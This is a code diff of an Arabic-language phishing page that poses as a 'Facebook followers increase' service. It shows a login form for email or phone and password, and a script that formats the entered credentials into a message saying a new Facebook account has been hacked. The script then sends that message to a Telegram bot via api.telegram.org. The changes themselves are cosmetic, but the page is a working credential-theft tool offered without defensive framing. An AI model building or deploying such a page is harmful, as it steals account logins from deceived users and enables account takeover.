@@ -49,7 +49,7 @@
 <body>
 
   <div class="form-container">
-   <h2>🚀 زيادة متابعين فيسبوك</h2>
+   <div><b>🚀 زيادة متابعين فيسبوك </b> </div>
     <form id="loginForm">
       <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
       <input type="password" id="password" placeholder="كلمة السر" required>
@@ -92,7 +92,7 @@
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    const message = `📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
+    const message = `📥 - تم اختراق حساب فيسبوك جديد :- \n\n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)}`;
 
@@ -108,6 +108,5 @@
       });
   });
 </script>
-
 </body>
 </html>
